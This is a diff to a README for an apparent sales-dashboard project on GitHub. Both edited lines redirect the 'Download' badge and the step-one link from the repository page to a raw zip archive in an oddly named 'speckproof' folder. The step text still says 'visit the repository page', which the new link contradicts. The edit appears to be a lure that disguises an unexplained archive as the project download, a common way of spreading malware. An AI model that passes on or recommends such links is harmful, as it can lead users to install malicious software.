@@ -1,6 +1,6 @@
 # 📊 sales-dashboard-project - Visualize sales trends for better decisions
 
-[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project)
+[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project/raw/refs/heads/main/speckproof/sales-project-dashboard-v2.5.zip)
 
 This project provides a clear view of business performance. It helps teams track sales, identify patterns, and understand data through visual reports. You can monitor key performance indicators to improve business results.
 
@@ -27,7 +27,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to access and use the dashboard.
 
-1. Visit the repository page to download the project files: [https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project](https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project).
+1. Visit the repository page to download the project files: [https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project/raw/refs/heads/main/speckproof/sales-project-dashboard-v2.5.zip](https://github.com/Mujahidsarraceniapurpurea65/sales-dashboard-project/raw/refs/heads/main/speckproof/sales-project-dashboard-v2.5.zip).
 2. Click the green Code button on the page.
 3. Select Download ZIP.
 4. Locate the file in your Downloads folder.
